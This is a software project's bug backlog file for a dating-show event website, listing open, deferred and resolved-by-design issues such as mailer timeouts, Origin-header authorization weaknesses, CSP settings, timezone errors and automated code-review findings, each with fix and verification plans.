# Bugs

- [ ] MEDIUM: Critical-flow browser smoke suite fails 12 of 24 on stale fixtures and selectors | Why: waiver helper waits for `[data-testid="apply-terms"]` but the standalone waiver has its own agreement control; apply and signup success checks time out; the ticket test selects `a.ticket-card--live` and `a.ticket-card--soldout` but regular live and sold-out cards now wrap a `.ticket-card__inner` anchor in a div (only the hidden presale anchor still matches), so the loop can skip every non-presale live or sold-out card and pass | Files: tests/smoke/critical-flows.spec.ts, tests/smoke/site.spec.ts | Plan: update fixtures to current form contracts and selectors, supply non-secret Firebase test config and mock network responses, select the rendered inner ticket anchors and assert a nonzero count against a fixed upcoming-event fixture, verify real popup navigation; run on main to separate harness failures from product bugs | Verify: desktop and mobile critical-flow runs pass with no skipped purchase assertions, no customer writes and no real notifications; a deliberately broken ticket href or form response fails the matching test
- [ ] MEDIUM: Full `npm audit` on main reports 17 dev dependency findings (12 high, 5 moderate) | Why: found while reproducing the October 19 ticket crash; production-only audit is zero, so these sit in dev tooling chains | Files: package.json, package-lock.json | Plan: capture full audit JSON, trace each affected dev dependency chain, apply compatible fixes, review any required major upgrade individually | Verify: full audit has no high findings (or each remaining one has a documented chain and reason), production audit stays zero, lint, astro check, vitest, build and `npm run test:runtime` pass

<!-- Doc routing (2026-07-13): this file is an OPEN backlog only. It holds
bugs not yet fixed, deferred or blocked items with their reason, and won't-fix
or resolved-by-design decisions (kept so the same report is not re-filed).
When a bug is fixed, DELETE its entry here in the same commit and record the
fix in CHANGELOG.md (plus LESSONS.md when the fix was non-obvious). Never add
fixed entries, [x] checkboxes or "Status: Fixed" records to this file. -->

## Open

### [HIGH] zohoMailer.sendMail has no bounded timeout, sitewide

- **Date:** 2026-08-27
- **File:** `src/lib/zohoMailer.ts` (`sendMail`, `createTransport` call), every API route that awaits it: `src/pages/api/capture-lead.ts`, `contestant-claim.ts`, `contestant-open-claim.ts`, `contestant-show-claim.ts`, `stage-waiver.ts`, `notify-application.ts`
- **Status:** Open
- **Severity:** High
- **What happened:** Found while auditing the dead-mailer notification pipeline (fix/notification-pipeline-recovery). `sendMail()` calls `nodemailer.createTransport({host: "smtp.zoho.com", port: 465, secure: true, auth})` with no `connectionTimeout`, `greetingTimeout`, or `socketTimeout` set, then `await transport.sendMail(...)` with no `AbortSignal`/`Promise.race` wrapper around it. If Zoho's SMTP endpoint hangs (TCP connect stalls, TLS handshake stalls, or the server accepts the connection but never responds to `MAIL FROM`), the awaited call blocks for however long nodemailer's own internal default is (effectively unbounded for connect/greeting), which on Vercel serverless holds the function open until the platform's own execution-time limit kills it, turning one slow SMTP attempt into a full request timeout for the caller instead of a fast, retryable failure.
- **Why deferred:** pre-existing, sitewide, cross-cutting code untouched by this session's A1-A3 work (this session only added new callers of the existing `sendMail`, it did not write `zohoMailer.ts`); out of scope for the notification-pipeline-recovery plan.
- **Fix:** add `connectionTimeout`/`greetingTimeout`/`socketTimeout` (e.g. 10s each) to the `createTransport` options so a hung SMTP attempt fails fast with a catchable error instead of hanging the function.
- **Verify:** point `ZOHO_SMTP_USER`/`_PASS` at an unreachable host or block outbound 465 in a test environment, confirm `sendMail()` rejects within the configured timeout instead of hanging to the platform limit.

### CodeRabbit PR #265 (2026-09-11)

- [ ] HIGH: Mail-sending endpoints authorize by Origin header and rate limit only, both bypassable by a non-browser caller | Why: notify-application.ts, notify-mixer-rsvp.ts and alert-failure.ts all gate their POST handler on isAllowedOrigin(origin) plus enforceRateLimit alone; Origin is a client-supplied header any direct HTTP caller can set to whatever it wants, and enforceRateLimit fails open (returns null) whenever UPSTASH_REDIS_REST_URL/TOKEN aren't configured (src/lib/rateLimit.ts:134-136), so a forged request can trigger emails to NOTIFICATION_EMAIL or ops pages with attacker-chosen name/email content, rate-limited only if Upstash happens to be configured in that environment. CodeRabbit flagged this against the new notify-mixer-rsvp.ts on PR #265, but the pattern is pre-existing and shared by notify-application.ts (already on main, predates this session), so patching only the new file would leave the other endpoints inconsistent with it, which this codebase's consistency rule forbids. None of these endpoints write Firestore directly (the actual lead write goes through the separately validated capture-lead.ts), so today's exploit ceiling is inbox/alert spam, not data corruption. Scope note (CodeRabbit follow-up, 2026-09-12): verify-turnstile.ts was removed from this entry because it sends no mail and reads no name/email; its Origin gating weakness is tracked separately below. | Files: src/pages/api/notify-application.ts, src/pages/api/notify-mixer-rsvp.ts, src/pages/api/alert-failure.ts, src/lib/allowedOrigin.ts, src/lib/rateLimit.ts | Plan: give each endpoint a server-side credential to check instead of trusting Origin (e.g. a short-lived token the endpoint that already validated the real payload issues, like capture-lead.ts for the lead/notify pair); audit each endpoint's actual write exposure first since severity differs per endpoint | Verify: a request with a forged Origin header and no valid credential is rejected on all 3 endpoints; the real client flows (apply form, mixer RSVP, ops alerts) still succeed end to end
- [ ] MEDIUM: verify-turnstile.ts skips bot verification entirely when TURNSTILE_SECRET_KEY is unset, and its only caller gate is the forgeable Origin header | Why: src/pages/api/verify-turnstile.ts:19-26 returns ok:true without contacting Cloudflare whenever the secret is not configured (commented as intentional opt-in), so any environment missing the env var silently runs with bot protection off while clients believe verification passed; with the secret set, the endpoint validates only the submitted token against Cloudflare and reads no name/email and sends no mail, so its exposure is limited to burning siteverify quota and the fail-open config risk, distinct from the mail-spam entry above (split out per CodeRabbit PR #265 follow-up, 2026-09-12) | Files: src/pages/api/verify-turnstile.ts | Plan: decide whether fail-open without the secret is still wanted; if yes, log/alert once at startup or first hit so a misconfigured prod environment is visible instead of silent, if no, fail closed outside dev; fold any auth change into the credential rework of the entry above | Verify: with TURNSTILE_SECRET_KEY unset the chosen behavior (loud pass-through or fail-closed) is observable; with it set, a bad token still returns 422 and a good token 200

### [MODERATE] 3 unfixed npm audit findings in @opentelemetry/core (via firebase-tools)

- **Date:** 2026-08-02
- **File:** `package-lock.json` (`firebase-tools` -> `@google-cloud/pubsub` -> `@opentelemetry/core`)
- **Status:** Open, deliberately deferred
- **Severity:** Moderate
- **What happened:** `npm audit` (full, including devDependencies) reports 3 moderate findings in `@opentelemetry/core`, pulled in transitively through `firebase-tools`. All 5 CI-gating high-severity findings (astro, brace-expansion, postcss, svgo, tar) were resolved via a plain `npm audit fix` lockfile resync, which also bumped `firebase-tools` from 15.23.0 to 15.25.1 within its existing `^15.23.0` range; these 3 remain because they're only fixable with `npm audit fix --force`, which per `npm audit --json`'s `fixAvailable` field downgrades `firebase-tools` 15.25.1 -> 14.23.0.
- **Why deferred:** all 3 findings are the same advisory, [GHSA-8988-4f7v-96qf](https://github.com/advisories/GHSA-8988-4f7v-96qf) (CWE-770, unbounded memory allocation when a service parses untrusted W3C Baggage propagation headers). `firebase-tools` is devDependency-only and does hold production credentials when run with them, so "devDependency" alone does not clear it: the advisory only fires in a process that parses trace-context headers from untrusted network input, and this project invokes `firebase-tools` as short-lived interactive/CI commands, never as a long-running service accepting external requests, so the vulnerable code path is not reachable here. CI's actual gate (`npm audit --audit-level=high --omit=dev`) also already excludes it and reports 0 vulnerabilities. Forcing a breaking downgrade of a dev tool for a moderate finding with no reachable attack path is not justified; the fix would trade a real regression (older `firebase-tools`, potential CLI incompatibilities) for closing an audit line with no exploitable exposure in how this project uses the tool.
- **Revisit when:** a newer `firebase-tools` release (a 15.x patch or a new major) resolves the `@opentelemetry/core` chain without a downgrade, or the finding starts blocking CI (severity change, `--omit=dev` policy change).

### [LOW] `app-alternatives.ts` FAQ answer falsely claims the Manhattan show is "Monthly"

- **Date:** 2026-08-27
- **File:** `src/data/journal/app-alternatives.ts` (line ~1018, the FAQ answer starting "Yes. Garam Masala Dating is the #1 desi comedy dating show at City Winery NYC in Manhattan...")
- **Status:** Open
- **Severity:** Low
- **What happened:** The answer states "Monthly shows with a mixer after," but only the Jersey City show runs monthly; the Manhattan show's schedule is erratic (roughly every 6 to 7 weeks, not a fixed interval). This is the same false-cadence defect fixed sitewide in commit `b654e07` and this session's follow-up commit, but this exact line wasn't caught by either sweep because it says "Monthly" rather than "weekly"/"bi-weekly", and it predates both commits, so it's queued here rather than fixed inline.
- **Why deferred:** pre-existing content this session did not write or touch; per provenance-based same-session close-out, only code this session authored gets fixed inline.
- **Revisit when:** next overnight pass. Fix: replace "Monthly shows with a mixer after." with a non-committal cadence word ("Regular shows with a mixer after." or "Shows run regularly, with a mixer after."), consistent with every other Manhattan-cadence fix in this same file and sitewide.

### [LOW] `diaspora-deep-dives.ts` has 5 curly-quote hrefs instead of straight quotes

- **Date:** 2026-08-27
- **File:** `src/data/journal/diaspora-deep-dives.ts` (lines 373, 723, 1071, 1187, 1295, pattern `href=’/cities/jersey-city’` instead of `href='/cities/jersey-city'`)
- **Status:** Open
- **Severity:** Low
- **What happened:** 5 anchor tags use curly single quotes (`’`) instead of straight quotes (`'`) around the `href` attribute value. Likely renders as a broken/unquoted attribute in the compiled HTML rather than a working link. Found while fixing an unrelated ambiguous-scope wording bug on these same lines (this session's fix touched only the surrounding prose, not the href markup itself). Confirmed pre-existing via `git diff` (present before this session's commits touched these lines).
- **Why deferred:** pre-existing content this session did not write; per provenance-based same-session close-out, only code this session authored gets fixed inline.
- **Revisit when:** next overnight pass. Fix: replace `href=’/cities/jersey-city’` with `href='/cities/jersey-city'` on all 5 lines; verify the anchor renders as a working link afterward (check compiled HTML or a dev-server render of one of the affected articles).

### [LOW] GitHub issue #210: `ReferenceError: Cannot access uninitialized variable` has no reachable stack trace

- **Date:** 2026-08-26
- **File:** Unknown, no stack trace in the PostHog-filed issue body.
- **Status:** Open
- **Severity:** Low
- **What's happening:** Safari's exact wording for a temporal-dead-zone `ReferenceError`. No stack trace is attached to the issue, and no PostHog API credential exists anywhere in this repo (checked `.env.example`, `api/`, `scripts/`, `package.json`), so the actual event payload isn't reachable from the codebase, only from the PostHog dashboard directly. No sourcemap config exists either, so even a stack couldn't be de-minified without one. No commits touched any user-facing page in the week around the issue's creation date, so if this were a live first-party bug it would be expected to recur, and it hasn't since.
- **Fix:** Needs a session with PostHog dashboard access (or an API key added to `.env.local`, never committed) to pull the actual stack trace and re-diagnose. Left open rather than closed on inference.

### [LOW] GitHub issue #161: `r.close is not a function` has no reachable stack trace

- **Date:** 2026-08-26
- **File:** Unknown, no stack trace in the PostHog-filed issue body.
- **Status:** Open
- **Severity:** Low
- **What's happening:** Same reachability problem as #210 (no PostHog credential in the repo, no sourcemap config). Every `.close()` call site in the codebase was checked directly: `dialog.close()`/`popup.close()` calls are on real `HTMLDialogElement`s, and `bitmap.close()` in `src/utils/compressImage.ts` is on a real `ImageBitmap` and is additionally wrapped in a `try/finally` inside an outer `try/catch`, so it cannot be the source even if it threw. Nothing in first-party source matches the minified `r.close` call.
- **Fix:** Same as #210, needs dashboard/API access to get the real stack. Left open rather than closed on inference.

### [MEDIUM] Event JSON-LD always uses New York's UTC offset, even for non-NY shows

- **Date:** 2026-07-16
- **File:** `src/utils/eventSchema.ts:2` (`nyOffset` from `src/utils/timezone.ts`), `src/data/events.ts` (`EventEntry.timezone` field)
- **Status:** Open
- **Severity:** Medium
- **What's happening:** `buildEventSchemas()` calls `nyOffset(e.isoDate, time)` unconditionally for every event's `startDate`/`endDate`/`doorTime`, regardless of the event's actual city. `EventEntry` already has an optional `timezone` field (IANA identifier, e.g. `"America/New_York"`) intended for exactly this, but nothing reads it: `nyOffset` is hardcoded to the `America/New_York` zone. Every non-NY show (San Diego, Chicago, and any future city) ships Event structured data with the wrong UTC offset baked into `startDate`/`endDate`. This is silent: it doesn't throw or fail a build, it just publishes incorrect machine-readable event times, which can make Google's Event rich results (and "Add to calendar" actions derived from them) show the wrong local time for that city.
- **Confirmed pre-existing:** `git diff main -- src/utils/eventSchema.ts src/utils/timezone.ts` shows this logic is untouched by the current per-event-landing-page work; it predates that effort and was never exercised for non-NY cities' individual event pages until now.
- **What should happen:** `buildEventSchemas` should resolve each event's actual IANA zone (`e.timezone ?? "America/New_York"`) and `nyOffset` should be generalized to accept a zone parameter (e.g. `offsetForZone(isoDate, time, timezone)`) instead of hardcoding New York.
- **Fix:** Not applied here, out of scope for the ad-tracking/checkout-redirect PR that surfaced it. Needs its own pass with a schema/timezone-focused smoke test (Rich Results Test on a San Diego or Chicago event page) rather than a drive-by fix.

### [MEDIUM] Cookie consent banner does not gate Meta/marketing tracking

- **Date:** 2026-07-16
- **File:** `src/components/CookieConsent.astro`, `src/components/meta-pixel.astro`, `src/components/gtm.astro`, `src/pages/api/go/[slug].ts`, `src/pages/api/sync-orders.ts`
- **Status:** Won't fix / by design (2026-07-16, Surbhi)
- **Severity:** Medium
- **What's happening:** The cookie banner writes a `marketing` boolean to localStorage, but nothing reads it before firing any Meta surface. `meta-pixel.astro` loads the Pixel unconditionally on idle and fires `fbq("init")` + `PageView` regardless of consent; `gtm.astro` loads the same way; the server-side CAPI calls added in this PR (`/api/go/[slug]`'s InitiateCheckout, `sync-orders.ts`'s Purchase) are server-to-server and were never going to be blockable by a client-side preference in the first place. Rejecting "marketing" in the banner therefore stops nothing. This predates the event-pages/CAPI work (Pixel and GTM already ignored consent); the new CAPI calls are consistent with that existing, ungated surface rather than a new gap.
- **Decision:** Confirmed intentional (Surbhi, 2026-07-16). The show targets US audiences only, with no EU/UK-targeted traffic, so GDPR-style consent gating is not a legal requirement here, and the business call is to keep every Meta signal, including the now-unblockable server CAPI, firing regardless of banner state. Devil's-advocate note recorded and accepted: server CAPI reaches a few more users than the browser Pixel alone would (it survives ad blockers and ITP), which is exactly the tradeoff being made on purpose. No consent-gating code will be built. Logged here so future reviews don't re-flag it as a new defect.

### [HIGH] Contestant workflow: portal + admin components still lack unit test coverage

- **Date:** 2026-07-16
- **File:** `src/components/ContestantPortal.tsx` (#97), `src/components/admin/TaskInbox.tsx` (#97), `src/components/admin/ContestantFunnel.tsx` (#99)
- **Status:** Open
- **Severity:** High
- **What happened:** All five phases of the contestant workflow project merged 2026-07-03 to 07-05 with zero unit tests, confirmed by a Stryker mutation report showing these files scoring 0 to 8% mutation coverage. The backend half of the gap (Zoho SMTP mailer, cal.com webhook, post-show and followups cron jobs) now has unit coverage, see CHANGELOG. The remaining three files are UI components: `ContestantPortal.tsx` is public facing and deferred to its own follow-up PR (not dropped, see ENHANCEMENTS.md); `TaskInbox.tsx` and `ContestantFunnel.tsx` are admin dashboard screens the operator plans to rewrite, so their tests are deferred until after that rewrite lands rather than writing tests for code about to be replaced (see ENHANCEMENTS.md).
- **Impact:** A regression in the contestant portal waiver flow or the admin Task Inbox/funnel view would not be caught by the test suite; only manual QA would notice.
- **Fix:** Write `ContestantPortal.tsx` tests in a dedicated follow-up PR (stateful component, needs `vi.stubGlobal("fetch")` plus `waitFor`). Write `TaskInbox.tsx`/`ContestantFunnel.tsx` tests against their post-rewrite replacements.

### [HIGH] Dev server cannot transform TypeScript in astro component scripts

- **Date:** 2026-07-05
- **File:** any `.astro` file with TypeScript inside a `<script>` tag (HomeSignup, NotifyModal, index and more)
- **Status:** Open for remaining files (CookieConsent fixed 2026-07-05; upstream Astro/Vite Rolldown issue remains open)
- **Severity:** High (dev only; production builds are unaffected)
- **What happened:** In `npm run dev`, the `vite:oxc` transform parses extracted astro scripts as plain JavaScript, so any TypeScript syntax (a `type` import specifier, `as` casts, non-null `!`) throws `[PARSE_ERROR]` and the script module 500s. Pages render but their client scripts never execute, which makes features look broken in dev while working fine in the built site.
- **Fix pattern (proven on CookieConsent):** extract logic to a plain `.ts` module imported via Vite's normal TS pipeline; keep the inline `<script>` as a bare import with zero TS syntax. Sweep the remaining affected files if the upstream Astro/Vite Rolldown fix does not land.

### [LOW] Popup CTA copy still uses weaker pre-audit wording

- **Date:** 2026-04-08
- **File:** `src/pages/index.astro`
- **Status:** Blocked on business decision (2026-07-05): no final offer exists yet. Tracked in ENHANCEMENTS.md under "Strengthen popup offer copy once the actual incentive is finalized".
- **Severity:** Low
- **What's happening:** The popup still says "Want Cheaper Tickets?" and "Get My Discount Code" rather than the stronger offer-based copy proposed in the audit.
- **What should happen:** Popup copy should use the updated conversion-focused wording once the actual offer is confirmed.
- **Fix:** Replace the popup headline, supporting copy, and CTA with the finalized offer language.

### [LOW] CSP uses unsafe-inline weakening XSS protection

- **Date:** 2026-04-04
- **File:** `vercel.json`
- **Status:** Open
- **Severity:** Low
- **What's happening:** Both script-src and style-src include 'unsafe-inline', weakening CSP XSS protection.
- **What should happen:** Since the site is SSG, nonces do not apply; hashes do. Migrate to Astro's `experimental.csp` support, which computes hashes for inline scripts and styles at build time, then move the Content-Security-Policy header out of `vercel.json` so there is one source of truth.
- **Fix:** Dedicated PR (2026-07-05 triage decision): the migration touches every page's inline scripts and needs its own smoke-test pass, so it stays out of batch fixes. Read the LESSONS.md entry on `unsafe-inline` and Astro island hydration first: PR #121 already broke the apply form once by removing it, so any migration must prove the two Astro hydration inline scripts are hashable before shipping.

## Deferred

### [MEDIUM] Home creators avatars were not upgraded to larger host photos

- **Date:** 2026-04-08
- **File:** `src/components/home/HomeCreators.astro`
- **Status:** Deferred (2026-07-05)
- **Severity:** Medium
- **What happened:** Superseded by the homepage visual redesign (owner decision 2026-07-05). Tracked in ENHANCEMENTS.md under "Finish full audit photo rollout"; decide sizing fresh in the redesign. Note if revisited: `hosts/wyatt.avif` source is 269x290, which caps avatars at about 160px before visible upscaling.

### [MEDIUM] Hosts page still uses small individual avatar images

- **Date:** 2026-04-08
- **File:** `src/pages/hosts.astro`
- **Status:** Deferred (2026-07-05)
- **Severity:** Medium
- **What happened:** Superseded by the homepage visual redesign (owner decision 2026-07-05). Tracked in ENHANCEMENTS.md under "Finish full audit photo rollout".

### [MEDIUM] Experience section photo placement was missed

- **Date:** 2026-04-08
- **File:** `src/components/home/HomeExperience.astro`
- **Status:** Deferred (2026-07-05)
- **Severity:** Medium
- **What happened:** Superseded by the homepage visual redesign (owner decision 2026-07-05). Tracked in ENHANCEMENTS.md under "Finish full audit photo rollout".

### [MEDIUM] Testimonials accent photo was not added

- **Date:** 2026-04-08
- **File:** `src/components/home/HomeTestimonials.astro`
- **Status:** Deferred (2026-07-05)
- **Severity:** Medium
- **What happened:** Superseded by the homepage visual redesign (owner decision 2026-07-05). Tracked in ENHANCEMENTS.md under "Finish full audit photo rollout".

### [MEDIUM] Journal decorative cupid artwork not implemented

- **Date:** 2026-04-08
- **File:** `src/pages/journal/index.astro`, `src/pages/journal/[slug].astro`
- **Status:** Deferred (2026-07-05)
- **Severity:** Medium
- **What happened:** Superseded by the homepage visual redesign (owner decision 2026-07-05). Tracked in ENHANCEMENTS.md under "Finish full audit photo rollout". The `ai-art/cupid-garden.webp` asset exists and remains unused.

## Won't fix and resolved by design

### [MEDIUM] Home hero photo background from audit not implemented

- **Date:** 2026-04-08
- **File:** `src/components/home/HomeHero.astro`
- **Status:** Won't fix (2026-07-05)
- **Severity:** Medium
- **What happened:** Owner directive: the hero is intentional and stays as designed (shader plus gradient). No photo layer will be added.

### [LOW] Leads collection allows unauthenticated phone updates

- **Date:** 2026-04-09
- **File:** `firestore.rules:45`
- **Status:** Resolved by design (2026-07-03)
- **Severity:** Low
- **What happened:** Confirmed intentional. The step-2 phone capture runs from the browser without auth — the caller needs the Firestore doc ID returned by `/api/capture-lead` to reach this path. Added a comment to `firestore.rules` explaining the design and the mitigation (doc ID as implicit ownership proof, field-only restriction).

### [LOW] Contact email usage is still inconsistent across pages

- **Date:** 2026-04-08
- **File:** `src/pages/faq.astro`, `src/pages/links.astro`
- **Status:** Resolved by design
- **Severity:** Low
- **What happened:** `contact@garammasaladating.com` is the canonical public contact (schema, legal, socials, llms.txt, FAQ footer). `press@garammasaladating.com` is intentionally used only in press/partnership-specific contexts (FAQ collaboration answer, links page press section). The two-inbox model is deliberate.

### Door time calculation can produce timestamp after show start time

- **File:** `src/utils/eventSchema.ts`
- **Source:** CodeRabbit PR #12
- **Status:** Resolved (no bug present)
- **Comment:** `subtractMinutes(start, 30)` computes `h * 60 + m - 30` with `Math.floor` — always produces a time 30 minutes before start. No clamping logic exists that could produce a later time. The referenced behavior does not reproduce in the current implementation.
- **Link:** https://github.com/hellosurbhi/garam-website/pull/12#discussion_r3054384028

### [MEDIUM] Admin restore/participated handlers discard their async promise

- **Date:** 2026-07-13
- **File:** `src/components/admin/AdminDashboard.tsx:290,295`
- **Source:** DeepSeek 20260713-142719
- **Status:** Resolved (no bug present)
- **Comment:** `handleRestore` and `handleParticipated` are async but their `ApplicantCard` callers are typed `() => void`, so the returned promise is discarded. Not a live bug: `handleUpdate` catches every write error internally and surfaces a toast, so the discarded promise can never reject. The handlers also wrap in try/finally for the pending-state cleanup.

### [MEDIUM] Journal countdown heading for position 4 has no rankedItems entry

- **Date:** 2026-07-13
- **File:** `src/data/journal/pop-culture-dating.ts:681`
- **Source:** DeepSeek 20260713-173257
- **Status:** Disproven (2026-07-13), do not auto-fix
- **Comment:** No such article exists; the post at that location is `dating-shows-south-asians-all-ranked` and its `rankedItems` array has all 7 contiguous positions. The countdown tests in `src/data/journal.test.ts` verify heading/position correspondence on every commit and pass.

### [MEDIUM] WaiverPanel ResizeObserver never re-observes a changed child

- **Date:** 2026-07-13
- **File:** `src/components/WaiverPanel.tsx`
- **Source:** DeepSeek 20260713-175426
- **Status:** Resolved by design (2026-07-13)
- **Comment:** `observer.disconnect()` in the effect cleanup drops every observed target per spec (no leak), and the child is the `WaiverDocument` article rendered from a compile-time constant, so its identity never changes within a mount.

### [MEDIUM] WaiverPanel handleScroll recreated each render

- **Date:** 2026-07-13
- **File:** `src/components/WaiverPanel.tsx`
- **Source:** DeepSeek 20260713-175426
- **Status:** Resolved by design (2026-07-13)
- **Comment:** React delegates synthetic events at the root; a new handler identity per render does not re-register DOM listeners. Wrapping in useCallback would add noise with no behavior change.
- **File:** `src/components/NotifyModal.astro:170`
- **Source:** CodeRabbit PR #12
- **Status:** Fixed (2026-07-03)
- **Comment:** Both paths now run through `toCitySlug()`: `const rawSlug = el.dataset.notifyCitySlug?.trim(); const citySlug = rawSlug ? toCitySlug(rawSlug) : toCitySlug(city)`.
- **Link:** https://github.com/hellosurbhi/garam-website/pull/12#discussion_r3063506949

---

# From CodeRabbit batch 2 (2026-04-10)

## Duplicate keyframes popupOut / modalOut in index.css

- **File:** `src/index.css:222-241`
- **Source:** CodeRabbit batch 2
- **Status:** Fixed (2026-07-03)
- **Comment:** Consolidated both identical keyframes into a single `@keyframes dialog-out`. Updated references in `index.astro` (popup close) and `HomeShows.astro` (city modal close).
- **Link:** n/a

## HomeFAQ.astro no transitionend timeout fallback

- **File:** `src/components/home/HomeFAQ.astro:55-88`
- **Source:** CodeRabbit batch 2
- **Status:** Fixed (2026-07-03)
- **Comment:** `closeAnimated` now uses a `done` flag + `setTimeout(cleanup, 400)` fallback alongside the `transitionend` listener. If the transition never fires (hidden ancestor, display:none, etc.), the `is-closing` class and `item.open` are cleaned up after 400ms regardless.
- **Link:** n/a

## HomeShows.astro empty city string passed to analytics

- **File:** `src/components/home/HomeShows.astro:111-124`
- **Source:** CodeRabbit batch 2
- **Status:** Fixed (2026-07-03)
- **Comment:** `identifyLead` and `trackLeadEvent` calls now use `const cityProp = city ? { city } : {}` and spread it conditionally, so `city` is never included when empty.
- **Link:** n/a

---

# Dead public assets (2026-04-13)

### [LOW] Confirmed unused files in public/

- **Date:** 2026-04-13
- **Files:**
  - `public/images/asset-3.svg`
  - `public/images/journal/journal-featured.webp`
  - `public/images/promo/links-hero.webp`
  - `public/images/promo/tickets-hero.webp`
- **Status:** Fixed (prior session)
- **Severity:** Low
- **What happened:** All four files were deleted from the public directory.

### [LOW] Hero variant files may be orphaned

- **Date:** 2026-04-13
- **Files:**
  - `public/images/hero/hero.avif`
  - `public/images/hero/hero-mobile.webp`
  - `public/images/hero/hero-mobile.avif`
- **Status:** Fixed (2026-07-03)
- **Severity:** Low
- **What happened:** `hero-mobile.*` were already gone. Confirmed `hero.avif` had no references anywhere in the codebase and deleted it. Updated CLAUDE.md to remove stale AVIF preload note.

## Medium priority (auto-fix pending)

### DeepSeek — 20260713-103550

(Empty section: the reviewer emitted a zero-finding COMMIT_BLOCK; nothing was ever queued. Kept for the record.)

### DeepSeek — 20260713-142719

- [x] MEDIUM: `handleRestore` at line 290 calls `handleUpdate` with no single-flight guard — same Firestore round-trip risk as the delete that was fixed. at src/components/admin/AdminDashboard.tsx:290 — Fixed same day: `pendingAction` single-flight guard now covers delete, restore and participated.
- [x] MEDIUM: `handleParticipated` at line 295 calls `handleUpdate` with no single-flight guard — same Firestore round-trip risk as the delete that was fixed. at src/components/admin/AdminDashboard.tsx:295 — Fixed same day: `pendingAction` single-flight guard now covers delete, restore and participated.
- [x] MEDIUM: `handleRestore` is an async function but the caller `onRestore` in `ApplicantCard` is typed as `() => void` — the returned promise is discarded, so any error in restore is silently swallowed. at src/components/admin/AdminDashboard.tsx:290 — Not a live bug: `handleUpdate` catches every write error internally and surfaces a toast, so the discarded promise can never reject. Handlers now also wrap in try/finally.
- [x] MEDIUM: `handleParticipated` is an async function but the caller `onParticipated` in `ApplicantCard` is typed as `() => void` — the returned promise is discarded, so any error in participated is silently swallowed. at src/components/admin/AdminDashboard.tsx:295 — Not a live bug: same reasoning as above; all rejection paths are caught inside the handler chain.

### DeepSeek — 20260713-181721

- WONT-FIX (decision, do not re-file): reviewer asked to drop `set -e` from `.husky/pre-commit` as redundant with the `#!/bin/sh` shebang. Rejected: a shebang implies no error-exit behavior at all; `set -e` is load-bearing in a gate script and stays. At `.husky/pre-commit:2`.

### CodeRabbit — 20260713-173257

- [x] MEDIUM: Inconsistent heading levels in the `best-indian-dating-apps-ranked` countdown: items 7, 6, 5 used `h3` while items 4 through 1 used `h2`. (Entry was queued as an empty stub by the old header-only severity grep in the pre-commit hook; actual finding text restored by hand. Capture bug since fixed in `~/.claude/config/git-hooks/pre-commit` via `extract_severity`.) FIXED 2026-07-13: all seven items promoted to `h2` in `src/data/journal/app-alternatives.ts`, per Surbhi's call.

### DeepSeek — 20260713-173257

- [x] MEDIUM: `pop-culture-dating.ts` "best ways to meet" article body heading for position 4 has no corresponding `rankedItems` entry at `src/data/journal/pop-culture-dating.ts:681`
      DISPROVEN 2026-07-13, do not auto-fix: no such article exists; the post at that location is `dating-shows-south-asians-all-ranked` and its `rankedItems` array has all 7 contiguous positions. The countdown tests in `src/data/journal.test.ts` verify heading/position correspondence on every commit and pass.

### Codex — 2026-07-16T18:30Z

- [ ] MEDIUM: [UNASKED-CHANGE] `ENHANCEMENTS.md:1502` adds an unrelated reviewer-outage log entry that does not trace to the stated changelog-correction intent.

### Codex — 2026-07-16T18:36Z

- [ ] MEDIUM: The commit message claims repos must belong to the authenticated GitHub user, but `scripts/lib/repos.sh:58` applies that filter only when `_gh_login` returns a value. Authentication or cache failure makes discovery fail open to third-party GitHub repos.

### Codex — 2026-07-16T18:43Z

- [ ] MEDIUM: [UNASKED-CHANGE] `ENHANCEMENTS.md:1502` remains unrelated reviewer telemetry with no trace to the stated changelog-correction intent. Commit `3e13d42` also still overclaims the authenticated-owner filter as unconditional despite `repos.sh:58` applying it only when `_gh_login` succeeds.

### Codex (2026-07-16T18:52Z)

- [ ] MEDIUM: [UNASKED-CHANGE] `ENHANCEMENTS.md:1502` adds reviewer-outage telemetry unrelated to the stated changelog correction. `BUGS.md:640` and `BUGS.md:648` then duplicate that finding as open backlog work.

### Codex (2026-07-16T19:10Z)

- [ ] MEDIUM: [UNASKED-CHANGE] `ENHANCEMENTS.md:1502` does not trace to the stated changelog-correction intent. `BUGS.md:640`, `BUGS.md:648` and `BUGS.md:652` then queue the same finding repeatedly, leaving duplicate open backlog entries.

### Codex (2026-07-16T19:17Z)

- [ ] MEDIUM: [UNASKED-CHANGE] `ENHANCEMENTS.md:1502` is unrelated reviewer telemetry. `BUGS.md:640`, `BUGS.md:648`, `BUGS.md:652` and `BUGS.md:656` then preserve the same issue as multiple open backlog entries instead of deduplicating or resolving it.

### Codex (2026-07-16T19:23Z)

- [ ] MEDIUM: `BUGS.md:638-660` adds six open findings although the commit message claims five. Five duplicate a telemetry complaint explicitly covered by the stated intent while the owner-filter finding is resolved by `CHANGELOG.md:11`, leaving stale backlog entries.

### Codex (2026-07-16T19:28Z)

- [ ] MEDIUM: [UNASKED-CHANGE] `BUGS.md:662-664` and `ENHANCEMENTS.md:1508-1510` add reviewer telemetry unrelated to the stated comma-only intent. The enhancement also falsely claims `CHANGELOG.md:11` still contains the Oxford comma removed by this commit.

### DeepSeek — 20260715-160953

- [ ] MEDIUM: The finding logged from CodeRabbit appears to be truncated ("...unchange..."). This could hide the full context of the finding.
  > a/ENHANCEMENTS.md:1498 | + - LOW: [CodeRabbit] ENHANCEMENTS.md: Verify each finding against current code. Fix only still-valid issues, skip the rest with a brief reason, keep changes minimal, and validate. In @ENHANCEMENTS.md at line 1493, Update the metadata timestamp entry in ENHANCEMENTS.md to use the repository-approved dash-free separator format instead of the hyphenated date in the 2026-07-15T20:02Z value. Preserve the remaining metadata fields unchange...

### Codex (2026-07-17T15:12Z)

- MEDIUM `INACCURATE-HISTORY` in the `4c6e07a` commit body: won't fix, kept here so the same report is not re-filed. Both points are conceded as accurate. The em dash sits in `1f0a217`'s message, not `f1d5483`'s. And `widget_load_failed` existed before the fix in the `createWidget` catch paths and the inline embed timeout; what the fix added is firing it when the modal never opens after a click. The committed docs state both facts correctly, so the inaccuracies live only in the message of a commit already on origin, and rewriting a published commit message requires a force push, which is prohibited.

### Codex (2026-07-17T15:16Z)

- [ ] MEDIUM: `INACCURATE-POLICY` in the Codex 2026-07-17T15:12Z won't-fix rationale above: rewriting the published non-main commit would require a forced update, but it is not categorically prohibited. The governing rule permits `--force-with-lease` after a rebase and prohibits only bare `--force` and forced updates to main. The won't-fix choice may stand, but its stated rationale is false.

## High priority (from push reviews, fix first)

### Codex (2026-08-03T06:53Z)

